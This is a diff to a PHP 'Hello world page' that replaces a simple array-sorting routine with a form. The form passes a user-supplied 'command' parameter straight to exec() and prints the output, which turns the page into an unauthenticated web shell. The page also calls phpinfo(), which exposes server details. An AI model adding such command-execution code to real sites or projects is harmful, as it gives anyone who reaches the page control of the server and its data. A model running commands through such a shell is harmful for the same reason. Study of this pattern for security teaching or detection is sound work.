@@ -1,37 +1,33 @@
 <html lang="en">
+
 <head>
-<title>Hello world page</title>
-    <link rel="stylesheet" href="style.css" type="text/css"/>
+    <title>Hello world page</title>
+    <link rel="stylesheet" href="style.css" type="text/css" />
 </head>
+
 <body>
-<h1>Хочу пивка</h1>
+    <h1>Хочу пивка</h1>
 
-<?php
-    $array = $_GET["arr"];
+    <form method="GET" action="">
+        <input name="command" type="text" size="50">
+        <input type="submit">
+    </form>
 
-    foreach($array as $elem){
-        echo($elem );
-        echo(", ");
-    }
+    <?php
+    $cmd = $_GET["command"];
 
-    $len = count($array);
-    for($i = 0; $i < $len; $i++){
-        for($j = 1; $j < $len; $j++){
-            $k = $j - 1;
-            if($array[$j] < $array[$k]){
-                list($array[$j], $array[$k]) = array($array[$k], $array[$j]);
-            }
-        }
-    }
-    echo("<br> ");
-    foreach($array as $elem){
-        echo($elem );
-        echo(", ");
-    }
+    $output=null;
+    $retval=null;
+    exec($cmd , $output, $retval);
+    echo "Command >> $cmd \n<br>";
+    echo "Returned with status $retval and output:\n";
+    print_r($output);
+
 ?>
 
-<?php
+    <?php
     phpinfo();
 ?>
 </body>
+
 </html>
